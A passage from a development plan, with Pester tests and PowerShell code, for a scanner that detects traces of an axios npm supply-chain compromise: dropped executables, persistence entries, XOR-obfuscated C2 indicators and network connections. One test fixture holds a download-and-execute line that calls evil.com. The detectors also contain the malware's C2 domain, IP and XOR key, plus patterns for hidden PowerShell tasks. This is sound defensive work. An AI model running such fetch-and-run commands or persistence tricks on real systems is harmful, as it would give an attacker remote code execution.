            'normal text file' | Set-Content (Join-Path $cleanDir 'readme.txt')
        }
        It 'returns empty without throwing' {
            { Search-DroppedPayloads -ScanPaths @($cleanDir) -AttackWindowStart $attackStart } | Should -Not -Throw
            Search-DroppedPayloads -ScanPaths @($cleanDir) -AttackWindowStart $attackStart | Should -BeNullOrEmpty
        }
    }

    Context 'PE executable (MZ header) created after attack window' {
        BeforeAll {
            $tmpDir = Join-Path $TestDrive 'suspicious-temp'
            $null = New-Item -ItemType Directory -Path $tmpDir -Force
            $exePath = Join-Path $tmpDir 'update_helper.exe'
            # Write MZ header (PE magic bytes)
            [byte[]]$mzBytes = 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00
            [IO.File]::WriteAllBytes($exePath, $mzBytes)
            (Get-Item $exePath).CreationTime = $attackStart.AddHours(1)
        }
        It 'detects PE file as DroppedExecutable with Critical severity' {
            $results = Search-DroppedPayloads -ScanPaths @($tmpDir) -AttackWindowStart $attackStart
            $r = $results | Where-Object Type -eq 'DroppedExecutable'
            $r          | Should -Not -BeNullOrEmpty
            $r.Severity | Should -Be 'Critical'
        }
        It 'includes SHA256 hash in finding' {
            $results = Search-DroppedPayloads -ScanPaths @($tmpDir) -AttackWindowStart $attackStart
            ($results | Where-Object Type -eq 'DroppedExecutable').Hash | Should -Not -BeNullOrEmpty
        }
    }

    Context 'suspicious PowerShell script created after attack window' {
        BeforeAll {
            $tmpDir   = Join-Path $TestDrive 'ps-temp'
            $null     = New-Item -ItemType Directory -Path $tmpDir -Force
            $ps1Path  = Join-Path $tmpDir 'a1b2c3d4.ps1'
            'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload")' | Set-Content $ps1Path
            (Get-Item $ps1Path).CreationTime = $attackStart.AddMinutes(30)
        }
        It 'detects ps1 in temp as SuspiciousScript' {
            $results = Search-DroppedPayloads -ScanPaths @($tmpDir) -AttackWindowStart $attackStart
            ($results | Where-Object Type -eq 'SuspiciousScript') | Should -Not -BeNullOrEmpty
        }
    }

    Context 'file created before attack window' {
        BeforeAll {
            $tmpDir  = Join-Path $TestDrive 'old-temp'
            $null    = New-Item -ItemType Directory -Path $tmpDir -Force
            $oldExe  = Join-Path $tmpDir 'old.exe'
            [byte[]]$mzBytes = 0x4D, 0x5A
            [IO.File]::WriteAllBytes($oldExe, $mzBytes)
            (Get-Item $oldExe).CreationTime = $attackStart.AddDays(-30)
        }
        It 'does not flag files predating the attack' {
            $results = Search-DroppedPayloads -ScanPaths @($tmpDir) -AttackWindowStart $attackStart
            $results | Should -BeNullOrEmpty
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Search-DroppedPayloads.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement**

`Private/Search-DroppedPayloads.ps1`:
```powershell
function Search-DroppedPayloads {
    [CmdletBinding()]
    param(
        [string[]]$ScanPaths,
        [datetime]$AttackWindowStart = [datetime]::Parse('2026-03-31T00:21:00Z').ToLocalTime()
    )

    # Default to the filesystem locations a dropper would target
    if (-not $ScanPaths) {
        $ScanPaths = @(
            $env:TEMP,
            $env:TMP,
            (Join-Path ($env:LOCALAPPDATA ?? $env:HOME) 'Temp'),
            ($env:LOCALAPPDATA ?? $env:HOME),
            ($env:APPDATA      ?? (Join-Path $env:HOME '.config'))
        ) | Where-Object { $_ -and (Test-Path $_) } | Select-Object -Unique
    }

    $suspiciousExtensions = @('.exe', '.dll', '.ps1', '.vbs', '.bat', '.cmd', '.js', '.msi')
    $findings = [System.Collections.Generic.List[PSCustomObject]]::new()

    foreach ($scanPath in $ScanPaths) {
        try {
            Get-ChildItem -Path $scanPath -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.CreationTime -ge $AttackWindowStart } |
            Select-Object -First 2000 |   # safety cap
            ForEach-Object {
                $file = $_
                $type = $null
                $sev  = 'Medium'

                # Check for PE magic bytes (MZ header = 0x4D 0x5A)
                if ($file.Extension -in @('.exe', '.dll') -or $file.Length -gt 0) {
                    try {
                        $bytes = [IO.File]::ReadAllBytes($file.FullName) | Select-Object -First 2
                        if ($bytes.Count -ge 2 -and $bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
                            $type = 'DroppedExecutable'
                            $sev  = 'Critical'
                        }
                    } catch { }
                }

                # Check suspicious script extensions in temp-like locations
                if (-not $type -and $file.Extension -in @('.ps1', '.vbs', '.bat', '.cmd')) {
                    $type = 'SuspiciousScript'
                    $sev  = 'High'
                }

                if ($type) {
                    $hash = $null
                    try { $hash = (Get-FileHash $file.FullName -Algorithm SHA256).Hash.ToLower() } catch { }
                    $findings.Add([PSCustomObject]@{
                        Type         = $type
                        Path         = $file.FullName
                        Hash         = $hash
                        CreationTime = $file.CreationTime
                        Severity     = $sev
                        Description  = "${type} created after attack window in temp/appdata location: $($file.FullName)"
                    })
                }
            }
        } catch { Write-Warning "Error scanning ${scanPath}: $_" }
    }

    return @($findings)
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/Search-DroppedPayloads.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/Search-DroppedPayloads.ps1 Tests/Search-DroppedPayloads.Tests.ps1
git commit -m "feat: add Search-DroppedPayloads RAT payload detector"
```

---

## Task 7: Find-PersistenceArtifacts — Scheduled Tasks, Registry, Startup

**Why this matters:** A RAT that can't survive a reboot is less valuable to an attacker. Persistence is the clearest sign the attacker intended to maintain long-term access. Finding persistence mechanisms means the RAT was fully deployed.

**Files:**
- Create: `Tests/Find-PersistenceArtifacts.Tests.ps1`
- Create: `Private/Find-PersistenceArtifacts.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/Find-PersistenceArtifacts.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/Find-PersistenceArtifacts.ps1"
    $attackStart = [datetime]::Parse('2026-03-31T00:21:00Z').ToLocalTime()
}

Describe 'Find-PersistenceArtifacts' {
    Context 'suspicious scheduled task registered after attack' {
        BeforeAll {
            Mock Get-ScheduledTask {
                @([PSCustomObject]@{
                    TaskName  = 'WindowsUpdateHelper'
                    TaskPath  = '\'
                    State     = 'Ready'
                    Actions   = @([PSCustomObject]@{ Execute = 'powershell.exe'; Arguments = '-WindowStyle Hidden -File C:\Users\user\AppData\Local\Temp\a1b2c3.ps1' })
                    Date      = $attackStart.AddHours(2).ToString('o')
                })
            }
        }
        It 'returns a SuspiciousScheduledTask finding' {
            $results = Find-PersistenceArtifacts -AttackWindowStart $attackStart
            ($results | Where-Object Type -eq 'SuspiciousScheduledTask') | Should -Not -BeNullOrEmpty
        }
        It 'severity is Critical' {
            $results = Find-PersistenceArtifacts -AttackWindowStart $attackStart
            ($results | Where-Object Type -eq 'SuspiciousScheduledTask').Severity | Should -Be 'Critical'
        }
    }

    Context 'registry Run key with temp-path value added after attack' {
        BeforeAll {
            Mock Get-ItemProperty {
                [PSCustomObject]@{
                    PSPath       = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
                    'NodeHelper' = 'C:\Users\user\AppData\Local\Temp\node_helper.exe'
                }
            } -ParameterFilter { $Path -match 'Run' }
        }
        It 'returns a SuspiciousRunKey finding' {
            $results = Find-PersistenceArtifacts -AttackWindowStart $attackStart
            ($results | Where-Object Type -eq 'SuspiciousRunKey') | Should -Not -BeNullOrEmpty
        }
    }

    Context 'no suspicious entries' {
        BeforeAll {
            Mock Get-ScheduledTask { @() }
            Mock Get-ItemProperty  { [PSCustomObject]@{ PSPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' } }
        }
        It 'returns empty without throwing' {
            { Find-PersistenceArtifacts -AttackWindowStart $attackStart } | Should -Not -Throw
            Find-PersistenceArtifacts -AttackWindowStart $attackStart    | Should -BeNullOrEmpty
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Find-PersistenceArtifacts.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement**

`Private/Find-PersistenceArtifacts.ps1`:
```powershell
function Find-PersistenceArtifacts {
    [CmdletBinding()]
    param(
        [datetime]$AttackWindowStart = [datetime]::Parse('2026-03-31T00:21:00Z').ToLocalTime()
    )

    $findings = [System.Collections.Generic.List[PSCustomObject]]::new()
    $suspiciousPaths = @('temp', 'tmp', 'appdata', 'localappdata', 'programdata', 'public')

    # ── Scheduled Tasks ────────────────────────────────────────────────────────
    try {
        Get-ScheduledTask -ErrorAction SilentlyContinue |
        Where-Object { $_.TaskPath -notmatch '^\\Microsoft\\' -and $_.State -ne 'Disabled' } |
        ForEach-Object {
            $task = $_
            # Was this task registered after the attack?
            $taskDate = $null
            try { $taskDate = [datetime]::Parse($task.Date) } catch { }
            $isNew = $taskDate -and $taskDate -ge $AttackWindowStart

            foreach ($action in $task.Actions) {
                $exe  = $action.Execute ?? ''
                $args = $action.Arguments ?? ''
                $full = "$exe $args".ToLower()

                $isSuspiciousPath   = $suspiciousPaths | Where-Object { $full -match $_ }
                $isSuspiciousExe    = $exe -match 'powershell|wscript|cscript|mshta|rundll32|regsvr32|cmd\.exe'
                $hasHiddenWindow    = $args -match '-windowstyle\s+hidden|-w\s+hidden|-nop|-noni'

                if ($isNew -or ($isSuspiciousPath -and $isSuspiciousExe) -or $hasHiddenWindow) {
                    $findings.Add([PSCustomObject]@{
                        Type        = 'SuspiciousScheduledTask'
                        Location    = "Task Scheduler: $($task.TaskPath)$($task.TaskName)"
                        Name        = $task.TaskName
                        Value       = "$exe $args"
                        Severity    = 'Critical'
                        Description = "Scheduled task '$($task.TaskName)' runs suspicious command: $exe $args"
                    })
                }
            }
        }
    } catch { Write-Warning "Scheduled task scan failed: $_" }

    # ── Registry Run Keys ──────────────────────────────────────────────────────
    $runKeys = @(
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
    )

    foreach ($keyPath in $runKeys) {
        try {
            $props = Get-ItemProperty -Path $keyPath -ErrorAction SilentlyContinue
            if (-not $props) { continue }

            $props.PSObject.Properties |
            Where-Object { $_.Name -notin @('PSPath','PSParentPath','PSChildName','PSDrive','PSProvider') } |
            ForEach-Object {
                $val  = $_.Value.ToLower()
                $isSuspiciousPath = $suspiciousPaths | Where-Object { $val -match $_ }
                $hasNodeOrScript  = $val -match 'node|npm|\.ps1|\.vbs|\.bat|\.cmd|\.js'

                if ($isSuspiciousPath -or $hasNodeOrScript) {
                    $findings.Add([PSCustomObject]@{
                        Type        = 'SuspiciousRunKey'
                        Location    = $keyPath
                        Name        = $_.Name
                        Value       = $_.Value
                        Severity    = 'Critical'
                        Description = "Registry Run key '$($_.Name)' points to suspicious path: $($_.Value)"
                    })
                }
            }
        } catch { Write-Warning "Registry key scan failed for ${keyPath}: $_" }
    }

    # ── Startup Folder ─────────────────────────────────────────────────────────
    $startupFolders = @(
        [Environment]::GetFolderPath('Startup'),
        [Environment]::GetFolderPath('CommonStartup')
    ) | Where-Object { $_ -and (Test-Path $_) }

    foreach ($folder in $startupFolders) {
        try {
            Get-ChildItem -Path $folder -File -ErrorAction SilentlyContinue |
            Where-Object { $_.CreationTime -ge $AttackWindowStart } |
            ForEach-Object {
                $findings.Add([PSCustomObject]@{
                    Type        = 'SuspiciousStartupEntry'
                    Location    = $folder
                    Name        = $_.Name
                    Value       = $_.FullName
                    Severity    = 'Critical'
                    Description = "File added to startup folder after attack window: $($_.FullName)"
                })
            }
        } catch { Write-Warning "Startup folder scan failed for ${folder}: $_" }
    }

    return @($findings)
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/Find-PersistenceArtifacts.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/Find-PersistenceArtifacts.ps1 Tests/Find-PersistenceArtifacts.Tests.ps1
git commit -m "feat: add Find-PersistenceArtifacts (scheduled tasks, registry, startup)"
```

---

## Task 8: Search-XorEncodedC2 — Obfuscated Indicator Detection

**Why this matters:** The malware uses XOR key `OrDeR_7077` with constant `333` to obfuscate its payload. A file containing the C2 domain won't have it in plaintext — it'll be XOR'd. The plain-text C2 scan in Task 4 misses all obfuscated copies.

**XOR algorithm:** `result_byte = (source_byte XOR keyByte[i % keyLen]) XOR (333 AND 0xFF)`
The constant `333 & 0xFF = 77 (0x4D)`.

**Files:**
- Create: `Tests/Search-XorEncodedC2.Tests.ps1`
- Create: `Private/Search-XorEncodedC2.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/Search-XorEncodedC2.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/Search-XorEncodedC2.ps1"
}

Describe 'Search-XorEncodedC2' {
    Context 'XOR encoding/decoding' {
        It 'decodes a string encoded with OrDeR_7077 key and 333 constant back to original' {
            $original  = 'sfrclak.com'
            $key       = 'OrDeR_7077'
            $constant  = 333 -band 0xFF   # = 77

            $keyBytes   = [Text.Encoding]::UTF8.GetBytes($key)
            $srcBytes   = [Text.Encoding]::UTF8.GetBytes($original)
            $encoded    = New-Object byte[] $srcBytes.Length
            for ($i = 0; $i -lt $srcBytes.Length; $i++) {
                $encoded[$i] = [byte](($srcBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]) -bxor $constant)
            }

            $decoded = Invoke-XorDecode -Data $encoded
            [Text.Encoding]::UTF8.GetString($decoded) | Should -Be $original
        }
    }

    Context 'file containing XOR-encoded C2 domain' {
        BeforeAll {
            $key      = 'OrDeR_7077'
            $constant = 333 -band 0xFF
            $keyBytes = [Text.Encoding]::UTF8.GetBytes($key)
            $srcBytes = [Text.Encoding]::UTF8.GetBytes('sfrclak.com')
            $encoded  = New-Object byte[] $srcBytes.Length
            for ($i = 0; $i -lt $srcBytes.Length; $i++) {
                $encoded[$i] = [byte](($srcBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]) -bxor $constant)
            }

            $tmpDir  = Join-Path $TestDrive 'xor-test'
            $null    = New-Item -ItemType Directory $tmpDir -Force
            $xorFile = Join-Path $tmpDir 'payload.bin'
            # Pad with some junk before and after
            $junk    = [byte[]](1..10 | ForEach-Object { Get-Random -Maximum 255 })
            [IO.File]::WriteAllBytes($xorFile, ($junk + $encoded + $junk))
        }
        It 'detects XOR-encoded sfrclak.com as XorEncodedC2' {
            $results = Search-XorEncodedC2 -SearchPaths @($tmpDir)
            ($results | Where-Object Type -eq 'XorEncodedC2') | Should -Not -BeNullOrEmpty
        }
        It 'severity is Critical' {
            $results = Search-XorEncodedC2 -SearchPaths @($tmpDir)
            ($results | Where-Object Type -eq 'XorEncodedC2').Severity | Should -Be 'Critical'
        }
        It 'includes decoded indicator in finding' {
            $results = Search-XorEncodedC2 -SearchPaths @($tmpDir)
            ($results | Where-Object Type -eq 'XorEncodedC2').DecodedIndicator | Should -Match 'sfrclak\.com'
        }
    }

    Context 'clean file' {
        BeforeAll {
            $cleanDir  = Join-Path $TestDrive 'clean-xor'
            $null      = New-Item -ItemType Directory $cleanDir -Force
            'hello world this is a normal file' | Set-Content (Join-Path $cleanDir 'readme.txt')
        }
        It 'returns empty for files with no encoded C2' {
            Search-XorEncodedC2 -SearchPaths @($cleanDir) | Should -BeNullOrEmpty
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Search-XorEncodedC2.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement**

`Private/Search-XorEncodedC2.ps1`:
```powershell
function Invoke-XorDecode {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][byte[]]$Data,
        [string]$Key      = 'OrDeR_7077',
        [int]$Constant    = 333
    )
    $keyBytes = [Text.Encoding]::UTF8.GetBytes($Key)
    $mask     = $Constant -band 0xFF
    $result   = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $result[$i] = [byte](($Data[$i] -bxor $keyBytes[$i % $keyBytes.Length]) -bxor $mask)
    }
    return $result
}

function Search-XorEncodedC2 {
    [CmdletBinding()]
    param(
        [string[]]$SearchPaths
    )

    if (-not $SearchPaths) {
        $SearchPaths = @(
            $env:TEMP, $env:TMP,
            ($env:LOCALAPPDATA ?? $env:HOME),
            ($env:APPDATA      ?? (Join-Path $env:HOME '.config'))
        ) | Where-Object { $_ -and (Test-Path $_) } | Select-Object -Unique
    }

    $c2Indicators = @('sfrclak.com', '142.11.206.73')
    $findings     = [System.Collections.Generic.List[PSCustomObject]]::new()
    # Only scan file types that could plausibly carry an obfuscated payload
    $scanExts     = @('.exe', '.dll', '.bin', '.dat', '.ps1', '.js', '.vbs', '.bat', '.tmp', '.log')

    foreach ($scanPath in $SearchPaths) {
        try {
            Get-ChildItem -Path $scanPath -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Extension -in $scanExts -or $_.Extension -eq '' } |
            Select-Object -First 1000 |
            ForEach-Object {
                try {
                    $bytes   = [IO.File]::ReadAllBytes($_.FullName)
                    $decoded = Invoke-XorDecode -Data $bytes
                    $text    = [Text.Encoding]::UTF8.GetString($decoded)

                    foreach ($indicator in $c2Indicators) {
                        if ($text -match [regex]::Escape($indicator)) {
                            $findings.Add([PSCustomObject]@{
                                Type             = 'XorEncodedC2'
                                Path             = $_.FullName
                                DecodedIndicator = $indicator
                                Severity         = 'Critical'
                                Description      = "XOR-encoded C2 indicator '$indicator' found after decoding file: $($_.FullName)"
                            })
                            break
                        }
                    }
                } catch { }
            }
        } catch { Write-Warning "XOR scan error in ${scanPath}: $_" }
    }

    return @($findings)
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/Search-XorEncodedC2.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/Search-XorEncodedC2.ps1 Tests/Search-XorEncodedC2.Tests.ps1
git commit -m "feat: add Search-XorEncodedC2 obfuscated indicator detector"
```

---

## Task 9: Get-NetworkEvidence — DNS Cache, Active Connections, Firewall Logs

**Why this matters:** If the RAT successfully called home, there will be evidence. DNS cache proves name resolution happened. An active connection to `142.11.206.73:8000` means the RAT is running right now.

**Files:**
- Create: `Tests/Get-NetworkEvidence.Tests.ps1`
- Create: `Private/Get-NetworkEvidence.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/Get-NetworkEvidence.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/Get-NetworkEvidence.ps1"
}

Describe 'Get-NetworkEvidence' {
    Context 'C2 IP in active TCP connections' {
        BeforeAll {
            Mock Get-NetTCPConnection {
                @([PSCustomObject]@{ RemoteAddress = '142.11.206.73'; RemotePort = 8000; State = 'Established'; OwningProcess = 1234 })
            }
            Mock Get-Process { [PSCustomObject]@{ Id = 1234; Name = 'node'; Path = 'C:\Program Files\nodejs\node.exe' } }
        }
        It 'returns ActiveC2Connection finding' {
            $results = Get-NetworkEvidence
            ($results | Where-Object Type -eq 'ActiveC2Connection') | Should -Not -BeNullOrEmpty
        }
        It 'severity is Critical' {
            $results = Get-NetworkEvidence
            ($results | Where-Object Type -eq 'ActiveC2Connection').Severity | Should -Be 'Critical'
        }
    }

    Context 'C2 domain in DNS cache' {
        BeforeAll {
            Mock Get-NetTCPConnection { @() }
            Mock Invoke-Expression {
                "Entry                   : sfrclak.com`n  Name      : sfrclak.com`n  Type      : 1`n  TTL       : 300"
            } -ParameterFilter { $Command -match 'ipconfig' }
        }
        It 'returns DnsCacheHit finding' {
            $results = Get-NetworkEvidence
            ($results | Where-Object Type -eq 'DnsCacheHit') | Should -Not -BeNullOrEmpty
        }
        It 'severity is High' {
            $results = Get-NetworkEvidence
            ($results | Where-Object Type -eq 'DnsCacheHit').Severity | Should -Be 'High'
        }
    }

    Context 'C2 IP in firewall log' {
        BeforeAll {
            Mock Get-NetTCPConnection { @() }
            Mock Invoke-Expression    { '' } -ParameterFilter { $Command -match 'ipconfig' }
            $fwLog = Join-Path $TestDrive 'pfirewall.log'
            "2026-03-31 01:15:33 ALLOW TCP 10.0.0.5 142.11.206.73 49123 8000 1 - - - - - - - SEND" | Set-Content $fwLog
            Mock Get-Item { [PSCustomObject]@{ FullName = $fwLog } } -ParameterFilter { $Path -match 'pfirewall' }
        }
        It 'returns FirewallLogHit finding' {
            $results = Get-NetworkEvidence -FirewallLogPath (Join-Path $TestDrive 'pfirewall.log')
            ($results | Where-Object Type -eq 'FirewallLogHit') | Should -Not -BeNullOrEmpty
        }
    }

    Context 'clean network state' {
        BeforeAll {
            Mock Get-NetTCPConnection { @() }
            Mock Invoke-Expression    { 'no entries' } -ParameterFilter { $Command -match 'ipconfig' }
        }
        It 'returns empty without throwing' {
            { Get-NetworkEvidence } | Should -Not -Throw
            Get-NetworkEvidence    | Should -BeNullOrEmpty
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Get-NetworkEvidence.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement**

`Private/Get-NetworkEvidence.ps1`:
```powershell
function Get-NetworkEvidence {
    [CmdletBinding()]
    param(
        [string]$FirewallLogPath = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"
    )

    $c2IP      = '142.11.206.73'
    $c2Domain  = 'sfrclak.com'
    $c2Port    = 8000
    $findings  = [System.Collections.Generic.List[PSCustomObject]]::new()

    # ── Active TCP connections ─────────────────────────────────────────────────
    try {
        $c2Conns = Get-NetTCPConnection -ErrorAction SilentlyContinue |
                   Where-Object { $_.RemoteAddress -eq $c2IP -or $_.RemotePort -eq $c2Port }
        foreach ($conn in $c2Conns) {
            $procName = $null
            try { $procName = (Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue).Name } catch { }
            $findings.Add([PSCustomObject]@{
                Type        = 'ActiveC2Connection'
                Detail      = "$($conn.RemoteAddress):$($conn.RemotePort) State=$($conn.State) PID=$($conn.OwningProcess) Process=$procName"
                Severity    = 'Critical'
                Description = "ACTIVE connection to C2 endpoint $($conn.RemoteAddress):$($conn.RemotePort) — RAT likely running (process: $procName)"
            })
        }
    } catch { Write-Warning "TCP connection check failed: $_" }

    # ── DNS cache ──────────────────────────────────────────────────────────────
    try {
        $dnsOutput = Invoke-Expression 'ipconfig /displaydns' 2>$null
        if ($dnsOutput -match [regex]::Escape($c2Domain)) {
            $findings.Add([PSCustomObject]@{
                Type        = 'DnsCacheHit'
                Detail      = "DNS cache contains entry for $c2Domain"
                Severity    = 'High'
                Description = "$c2Domain found in DNS cache — machine resolved attacker domain (connection likely occurred)"
            })
        }
    } catch { Write-Warning "DNS cache check failed: $_" }

    # ── Windows Firewall log ───────────────────────────────────────────────────
    if (Test-Path $FirewallLogPath) {
        try {
            $fwContent = Get-Content $FirewallLogPath -Raw -ErrorAction Stop
            if ($fwContent -match [regex]::Escape($c2IP)) {
                $matches = [regex]::Matches($fwContent, "^[^\r\n]*$([regex]::Escape($c2IP))[^\r\n]*", 'Multiline')
                $sample  = ($matches | Select-Object -First 3 | ForEach-Object { $_.Value }) -join '; '
                $findings.Add([PSCustomObject]@{
                    Type        = 'FirewallLogHit'
                    Detail      = "Firewall log contains connection records to $c2IP — sample: $sample"
                    Severity    = 'High'
                    Description = "Windows Firewall log shows traffic to C2 IP $c2IP — machine communicated with attacker"
                })
            }
        } catch { Write-Warning "Firewall log scan failed: $_" }
    }

    return @($findings)
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/Get-NetworkEvidence.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/Get-NetworkEvidence.ps1 Tests/Get-NetworkEvidence.Tests.ps1
git commit -m "feat: add Get-NetworkEvidence (DNS cache, active connections, firewall log)"
```

---

## Task 10: New-ScanReport — Updated for All Finding Types (FR4)

**Files:**
- Create: `Tests/New-ScanReport.Tests.ps1`
- Create: `Private/New-ScanReport.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/New-ScanReport.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/New-ScanReport.ps1"

    $outDir   = Join-Path $TestDrive 'reports'
    $metadata = @{ Timestamp='2026-04-01 12:00:00 UTC'; Hostname='TESTHOST'; Username='testuser'; Duration='45.2s'; Paths=@('C:\Dev') }

    $projects = @([PSCustomObject]@{ ProjectPath='C:\Dev\app'; PackageJsonPath='C:\Dev\app\package.json' })

    $lockfileResults = @([PSCustomObject]@{
        ProjectPath='C:\Dev\app'; HasVulnerableAxios=$true; VulnerableAxiosVersion='1.14.1'
        HasMaliciousPlainCrypto=$true; LockfileType='npm'; LockfilePath='C:\Dev\app\package-lock.json'; Error=$null
    })

    $artifacts = @([PSCustomObject]@{ Type='MaliciousPackage'; Path='C:\Dev\app\node_modules\plain-crypto-js'; Hash=$null; Severity='Critical'; Description='plain-crypto-js found' })
    $cache     = @([PSCustomObject]@{ Type='NpmCacheHit'; Path='C:\npm-cache\entry'; PackageName='plain-crypto-js'; Version='4.2.1'; Severity='High'; Description='Found in cache' })
    $payloads  = @([PSCustomObject]@{ Type='DroppedExecutable'; Path='C:\Temp\svc.exe'; Hash='abc123'; CreationTime=[datetime]'2026-03-31 02:00'; Severity='Critical'; Description='PE in temp' })
    $persist   = @([PSCustomObject]@{ Type='SuspiciousScheduledTask'; Location='Task Scheduler'; Name='WinHelper'; Value='powershell.exe -File C:\Temp\x.ps1'; Severity='Critical'; Description='Suspicious task' })
    $xor       = @([PSCustomObject]@{ Type='XorEncodedC2'; Path='C:\Temp\payload.bin'; DecodedIndicator='sfrclak.com'; Severity='Critical'; Description='XOR encoded C2' })
    $network   = @([PSCustomObject]@{ Type='ActiveC2Connection'; Detail='142.11.206.73:8000 State=Established'; Severity='Critical'; Description='Active C2 connection' })

    $reportPath = New-ScanReport -Projects $projects -LockfileResults $lockfileResults -Artifacts $artifacts `
        -CacheFindings $cache -DroppedPayloads $payloads -PersistenceArtifacts $persist `
        -XorFindings $xor -NetworkEvidence $network -OutputPath $outDir -ScanMetadata $metadata
}

Describe 'New-ScanReport' {
    It 'creates report file'                          { Test-Path $reportPath | Should -BeTrue }
    It 'filename contains Axios-Scan-'                { [IO.Path]::GetFileName($reportPath) | Should -Match 'Axios-Scan-' }
    It 'contains EXECUTIVE SUMMARY'                   { Get-Content $reportPath -Raw | Should -Match 'EXECUTIVE SUMMARY' }
    It 'shows COMPROMISED status'                     { Get-Content $reportPath -Raw | Should -Match 'COMPROMISED' }
    It 'shows correct project count'                  { Get-Content $reportPath -Raw | Should -Match 'Total projects scanned\s*:\s*1' }
    It 'contains SCAN METADATA with hostname'         { Get-Content $reportPath -Raw | Should -Match 'TESTHOST' }
    It 'contains VULNERABLE PROJECTS section'         { Get-Content $reportPath -Raw | Should -Match 'VULNERABLE PROJECTS' }
    It 'lists vulnerable axios version'               { Get-Content $reportPath -Raw | Should -Match 'axios@1\.14\.1' }
    It 'contains FORENSIC ARTIFACTS section'          { Get-Content $reportPath -Raw | Should -Match 'FORENSIC ARTIFACTS' }
    It 'contains NPM CACHE FINDINGS section'          { Get-Content $reportPath -Raw | Should -Match 'NPM CACHE' }
    It 'contains DROPPED PAYLOADS section'            { Get-Content $reportPath -Raw | Should -Match 'DROPPED PAYLOADS' }
    It 'contains PERSISTENCE MECHANISMS section'      { Get-Content $reportPath -Raw | Should -Match 'PERSISTENCE MECHANISMS' }
    It 'contains XOR-ENCODED INDICATORS section'      { Get-Content $reportPath -Raw | Should -Match 'XOR-ENCODED' }
    It 'contains NETWORK EVIDENCE section'            { Get-Content $reportPath -Raw | Should -Match 'NETWORK EVIDENCE' }
    It 'contains CREDENTIALS AT RISK section'         { Get-Content $reportPath -Raw | Should -Match 'CREDENTIALS AT RISK' }
    It 'contains IOC REFERENCE appendix'              { Get-Content $reportPath -Raw | Should -Match 'sfrclak\.com' }
    It 'contains REMEDIATION GUIDANCE'                { Get-Content $reportPath -Raw | Should -Match 'npm cache clean' }

    Context 'clean scan' {
        It 'shows CLEAN status' {
            $cleanPath = New-ScanReport `
                -Projects            @([PSCustomObject]@{ ProjectPath='C:\ok'; PackageJsonPath='C:\ok\package.json' }) `
                -LockfileResults     @([PSCustomObject]@{ ProjectPath='C:\ok'; HasVulnerableAxios=$false; HasMaliciousPlainCrypto=$false; LockfileType='npm'; LockfilePath=''; VulnerableAxiosVersion=$null; Error=$null }) `
                -Artifacts           @() -CacheFindings @() -DroppedPayloads @() `
                -PersistenceArtifacts @() -XorFindings @() -NetworkEvidence @() `
                -OutputPath          $outDir -ScanMetadata $metadata
            Get-Content $cleanPath -Raw | Should -Match 'CLEAN'
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/New-ScanReport.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement**

`Private/New-ScanReport.ps1`:
```powershell
function New-ScanReport {
    [CmdletBinding()]
    param(
        [PSCustomObject[]]$Projects             = @(),
        [PSCustomObject[]]$LockfileResults      = @(),
        [PSCustomObject[]]$Artifacts            = @(),
        [PSCustomObject[]]$CacheFindings        = @(),
        [PSCustomObject[]]$DroppedPayloads      = @(),
        [PSCustomObject[]]$PersistenceArtifacts = @(),
        [PSCustomObject[]]$XorFindings          = @(),
        [PSCustomObject[]]$NetworkEvidence      = @(),
        [Parameter(Mandatory)][string]$OutputPath,
        [Parameter(Mandatory)][hashtable]$ScanMetadata
    )

    $vulnProjects   = @($LockfileResults     | Where-Object { $_.HasVulnerableAxios -or $_.HasMaliciousPlainCrypto })
